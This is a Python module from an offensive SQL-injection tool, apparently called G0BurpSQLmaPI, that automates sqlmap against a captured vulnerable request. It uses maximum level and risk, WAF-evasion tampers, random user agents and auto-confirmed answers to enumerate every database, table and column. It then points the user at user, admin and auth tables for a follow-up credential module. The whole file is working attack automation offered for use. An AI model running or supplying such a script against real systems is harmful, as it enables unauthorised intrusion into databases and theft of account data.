#!/usr/bin/env python3
"""
G0BurpSQLmaPI - Tables Discovery Module
Scans for REAL databases and tables - DISCOVERY ONLY
Shows all tables AND their columns
Author: nu11secur1ty
License: GPL-3.0
"""

import os
import sys
import json
import time
import shutil
import subprocess
import re
from pathlib import Path
from datetime import datetime

try:
    from colorama import init, Fore, Style
    init(autoreset=True, convert=True)
except Exception:
    class _C:
        def __getattr__(self, _): return ""
    Fore = Style = _C()

# ============================================================================
# PATHS
# ============================================================================

ROOT = Path.cwd()
MODULES_DIR = ROOT / "modules"
EXPLOIT_PATH = MODULES_DIR / "exploit.txt"
META_PATH = MODULES_DIR / "exploit_meta.json"
OUTPUT_DIR = ROOT / "tables_discovery"

OUTPUT_DIR.mkdir(exist_ok=True)

# SQLMap configuration
SQLMAP_ENV_VAR = "G0_SQLMAP_PATH"
SQLMAP_DEFAULT_PATHS = [
    "D:/CVE/sqlmap-nu11secur1ty/sqlmap.py",
    "/usr/bin/sqlmap",
    "/usr/local/bin/sqlmap",
    "sqlmap.py",
]

# ============================================================================
# YOUR TECHNIQUES - RISK LEVEL, TAMPERS, ETC
# ============================================================================

SQLMAP_LEVEL = "5"
SQLMAP_RISK = "3"
SQLMAP_TIME_SEC = "11"
SQLMAP_TAMPERS = "space2comment,between,charencode"
SQLMAP_NO_CAST = "--no-cast"
SQLMAP_NO_ESCAPE = "--no-escape"
SQLMAP_RANDOM_AGENT = "--random-agent"
SQLMAP_FLUSH_SESSION = "--flush-session"
SQLMAP_THREADS = "10"
SQLMAP_TIMEOUT = "30"
SQLMAP_RETRIES = "3"

# SQLMAP ANSWERS
SQLMAP_ANSWERS = "continue=Y,quit=N,proceed=Y,crack=Y,dict=Y,resolve=Y,follow=Y,test=Y"

# ============================================================================
# FUNCTIONS
# ============================================================================

def display_banner():
    """Display module banner"""
    print(Fore.CYAN + """
╔═══════════════════════════════════════════════════════════════╗
║                    TABLES DISCOVERY MODULE                    ║
║           SCANS REAL DATABASES, TABLES AND COLUMNS            ║
║                    Author: nu11secur1ty                       ║
╚═══════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)

def find_sqlmap():
    """Find sqlmap installation"""
    env_path = os.getenv(SQLMAP_ENV_VAR)
    if env_path:
        p = Path(env_path)
        if p.exists():
            return str(p)
    
    for path in SQLMAP_DEFAULT_PATHS:
        if Path(path).exists():
            return path
    
    for candidate in ("sqlmap.py", "sqlmap"):
        found = shutil.which(candidate)
        if found:
            return found
    return None

def load_exploit():
    """Load exploit file and parameters"""
    if not EXPLOIT_PATH.exists():
        print(Fore.RED + "ERROR: exploit.txt not found! Generate PoC first." + Style.RESET_ALL)
        return None, None
    
    try:
        vuln_params = []
        if META_PATH.exists():
            with open(META_PATH, 'r') as f:
                meta = json.load(f)
                vuln_params = meta.get("vuln_params", [])
        return EXPLOIT_PATH, vuln_params
    except Exception as e:
        print(Fore.RED + f"Error loading exploit: {e}" + Style.RESET_ALL)
        return None, None

def get_base_cmd(sqlmap_path, exploit_path, vuln_params):
    """Build base sqlmap command with YOUR TECHNIQUES"""
    if sqlmap_path.endswith(".py"):
        cmd = [sys.executable, sqlmap_path]
    else:
        cmd = [sqlmap_path]
    
    cmd += [
        "-r", str(exploit_path),
        f"--level={SQLMAP_LEVEL}",
        f"--risk={SQLMAP_RISK}",
        f"--time-sec={SQLMAP_TIME_SEC}",
        f"--tamper={SQLMAP_TAMPERS}",
        SQLMAP_NO_CAST,
        SQLMAP_NO_ESCAPE,
        SQLMAP_RANDOM_AGENT,
        SQLMAP_FLUSH_SESSION,
        f"--threads={SQLMAP_THREADS}",
        f"--timeout={SQLMAP_TIMEOUT}",
        f"--retries={SQLMAP_RETRIES}",
        "--batch",
        f"--answers={SQLMAP_ANSWERS}",
    ]
    
    if vuln_params:
        cmd += ["-p", ",".join(vuln_params)]
    
    return cmd

def run_sqlmap_command(cmd, description=""):
    """Run sqlmap and capture output"""
    if description:
        print(Fore.CYAN + f"\n[+] {description}" + Style.RESET_ALL)
    
    print(Fore.YELLOW + "[*] Running sqlmap with your techniques..." + Style.RESET_ALL)
    print("-" * 60)
    
    try:
        # Run sqlmap directly - shows colors
        result = subprocess.run(cmd, check=False)
        
        # Capture output for parsing
        cmd_capture = cmd.copy()
        capture_result = subprocess.run(cmd_capture, capture_output=True, text=True, check=False)
        output = capture_result.stdout + capture_result.stderr
        
        return output
        
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
        return ""

def get_real_databases(sqlmap_path, exploit_path, vuln_params):
    """Get REAL databases - parse only the actual database block"""
    print(Fore.CYAN + "\n[+] Getting REAL databases..." + Style.RESET_ALL)
    
    cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
    cmd.append("--dbs")
    
    output = run_sqlmap_command(cmd, "Scanning for databases")
    
    if not output:
        return []
    
    databases = []
    in_db_section = False
    
    # SKIP - system AND test databases
    skip = [
        'information_schema', 'performance_schema', 'mysql', 'sys', 
        'phpmyadmin', 'starting', 'ending', 'resuming', 'fetching', 'testing'
    ]
    
    for line in output.split('\n'):
        line_clean = line.strip()
        
        # Start collecting when we see the database list header
        if "available databases [" in line_clean.lower():
            in_db_section = True
            continue
        
        # If we are in the database list section
        if in_db_section:
            # Skip typical sqlmap logs that might show up in this block
            if any(log_lvl in line_clean.lower() for log_lvl in ["[info]", "[warning]", "[error]", "[critical]"]):
                continue
            
            # Look strictly for database names in the format [*] db_name
            match = re.match(r'^\[\*\]\s+([\w\-_]+)\s*$', line_clean)
            if match:
                db = match.group(1)
                if db.lower() not in skip:
                    databases.append(db)
            elif line_clean and not line_clean.startswith('[*]'):
                # If we hit a line that's clearly not a database name and doesn't start with [*],
                # we've exited the section
                if len(databases) > 0:
                    in_db_section = False
    
    # Remove duplicates and sort
    databases = sorted(list(set(databases)))
    
    if databases:
        print(Fore.GREEN + f"\n[+] Found {len(databases)} REAL databases:" + Style.RESET_ALL)
        for i, db in enumerate(databases, 1):
            print(f"    {i}. {db}")
    else:
        print(Fore.YELLOW + "[!] No real databases found." + Style.RESET_ALL)
    
    return databases

def get_real_tables(sqlmap_path, exploit_path, vuln_params, database):
    """Get REAL tables from a database using ASCII table structures"""
    print(Fore.CYAN + f"[*] Getting tables from: {database}" + Style.RESET_ALL)
    
    cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
    cmd += ["-D", database, "--tables"]
    
    output = run_sqlmap_command(cmd, f"Scanning {database}")
    
    if not output:
        return []
    
    # Check if database is empty
    if "appears to be empty" in output:
        print(Fore.YELLOW + f"[!] Database '{database}' appears to be empty" + Style.RESET_ALL)
        return []
    
    tables = []
    for line in output.split('\n'):
        line_clean = line.strip()
        
        # Parse output from sqlmap ASCII grids (e.g., | table_name |)
        match_grid = re.search(r'^\|\s*([\w\-_]+)\s*\|', line_clean)
        if match_grid:
            table = match_grid.group(1)
            if table.lower() not in ['table', 'tables'] and not table.startswith('-'):
                tables.append(table)
                continue
        
        # Fallback to standard list if no grid is found
        match_list = re.match(r'^\[\*\]\s+([\w\-_]+)\s*$', line_clean)
        if match_list:
            table = match_list.group(1)
            if table.lower() not in ['table', 'tables', 'starting', 'resuming', 'fetching']:
                tables.append(table)
    
    return sorted(list(set(tables)))

def get_table_columns(sqlmap_path, exploit_path, vuln_params, database, table):
    """Get ALL columns from a specific table using ASCII table structures"""
    print(Fore.CYAN + f"    [*] Getting columns from: {database}.{table}" + Style.RESET_ALL)
    
    cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
    cmd += ["-D", database, "-T", table, "--columns"]
    
    output = run_sqlmap_command(cmd, f"Scanning columns for {table}")
    
    if not output:
        return []
    
    columns = []
    for line in output.split('\n'):
        line_clean = line.strip()
        
        # Parse first column from sqlmap grids (e.g., | column_name | type |)
        match_grid = re.search(r'^\|\s*([\w\-_]+)\s*\|', line_clean)
        if match_grid:
            col = match_grid.group(1)
            if col.lower() not in ['column', 'columns'] and not col.startswith('-'):
                columns.append(col)
                continue
                
        # Fallback to standard list if no grid is found
        match_list = re.match(r'^\[\*\]\s+([\w\-_]+)\s*$', line_clean)
        if match_list:
            col = match_list.group(1)
            if col.lower() not in ['column', 'columns', 'starting', 'resuming', 'fetching']:
                columns.append(col)
    
    return sorted(list(set(columns)))

def save_results(all_data, databases_count, total_tables, total_columns):
    """Save results to JSON and TXT files - DISCOVERY ONLY"""
    # Save JSON
    json_file = OUTPUT_DIR / "tables_scan.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump(all_data, f, indent=2)
    
    print(Fore.GREEN + f"\n[+] JSON saved to: {json_file}" + Style.RESET_ALL)
    
    # Save TXT
    txt_file = OUTPUT_DIR / "tables_scan.txt"
    with open(txt_file, 'w', encoding='utf-8') as f:
        f.write("="*60 + "\n")
        f.write("TABLES DISCOVERY RESULTS\n")
        f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("="*60 + "\n\n")
        
        f.write(f"[Summary]\n")
        f.write(f"  Databases found: {databases_count}\n")
        f.write(f"  Tables found: {total_tables}\n")
        f.write(f"  Columns found: {total_columns}\n\n")
        
        for db, tables in all_data.items():
            f.write(f"\n[Database] {db}\n")
            f.write(f"[Tables] {len(tables)}\n")
            f.write("-"*40 + "\n")
            for table, columns in tables.items():
                f.write(f"  - {table}\n")
                for col in columns:
                    f.write(f"      - {col}\n")
    
    print(Fore.GREEN + f"[+] TXT saved to: {txt_file}" + Style.RESET_ALL)

def run_tables_discovery():
    """Main function - discover REAL databases, tables and columns - NO DUMP"""
    display_banner()
    
    # Check if exploit exists
    if not EXPLOIT_PATH.exists():
        print(Fore.RED + "ERROR: exploit.txt not found! Generate PoC first." + Style.RESET_ALL)
        print(Fore.YELLOW + "Please generate PoC first using option 1 from main menu." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Find sqlmap
    sqlmap_path = find_sqlmap()
    if not sqlmap_path:
        print(Fore.RED + "ERROR: sqlmap not found!" + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Load exploit
    exploit_path, vuln_params = load_exploit()
    if not exploit_path:
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Show configuration
    print(Fore.CYAN + "\n[*] Configuration:" + Style.RESET_ALL)
    print(f"    SQLMap: {sqlmap_path}")
    print(f"    Exploit: {exploit_path}")
    print(f"    Level: {SQLMAP_LEVEL}")
    print(f"    Risk: {SQLMAP_RISK}")
    print(f"    Time-Sec: {SQLMAP_TIME_SEC}")
    print(f"    Tamper: {SQLMAP_TAMPERS}")
    if vuln_params:
        print(f"    Parameters: {vuln_params}")
    print()
    
    # Confirm
    confirm = input(Fore.YELLOW + "Start FULL TABLES DISCOVERY (no dump)? [Y/n]: " + Style.RESET_ALL).strip().lower()
    if confirm not in ("", "y", "yes"):
        print(Fore.YELLOW + "Cancelled." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # STEP 1: Get REAL databases
    databases = get_real_databases(sqlmap_path, exploit_path, vuln_params)
    
    if not databases:
        print(Fore.RED + "No databases found!" + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # STEP 2: Get tables from each database
    print(Fore.CYAN + "\n[+] Scanning tables and columns..." + Style.RESET_ALL)
    print("="*60)
    
    all_data = {}
    total_tables = 0
    total_columns = 0
    
    for db in databases:
        tables = get_real_tables(sqlmap_path, exploit_path, vuln_params, db)
        
        if tables:
            all_data[db] = {}
            total_tables += len(tables)
            print(Fore.GREEN + f"[+] {db}: {len(tables)} tables" + Style.RESET_ALL)
            
            for table in tables:
                columns = get_table_columns(sqlmap_path, exploit_path, vuln_params, db, table)
                all_data[db][table] = columns
                total_columns += len(columns)
                print(Fore.CYAN + f"    - {table}: {len(columns)} columns" + Style.RESET_ALL)
                if columns:
                    for col in columns:
                        print(Fore.MAGENTA + f"        - {col}" + Style.RESET_ALL)
        else:
            all_data[db] = {}
            print(Fore.YELLOW + f"[!] {db}: No tables found" + Style.RESET_ALL)
    
    # Summary
    print(Fore.CYAN + "\n" + "="*60)
    print("DISCOVERY COMPLETE")
    print("="*60 + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] Databases discovered: {len(databases)}" + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] Tables discovered: {total_tables}" + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] Columns discovered: {total_columns}" + Style.RESET_ALL)
    
    # Save results
    save_results(all_data, len(databases), total_tables, total_columns)
    
    print(Fore.CYAN + "\nTIP: Update Users.py with these table names:" + Style.RESET_ALL)
    print(Fore.YELLOW + "Look for: users, admins, members, login, accounts, profiles, customers, employees, auth, roles" + Style.RESET_ALL)
    
    input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)

# ============================================================================
# MAIN ENTRYPOINT
# ============================================================================

if __name__ == "__main__":
    run_tables_discovery()
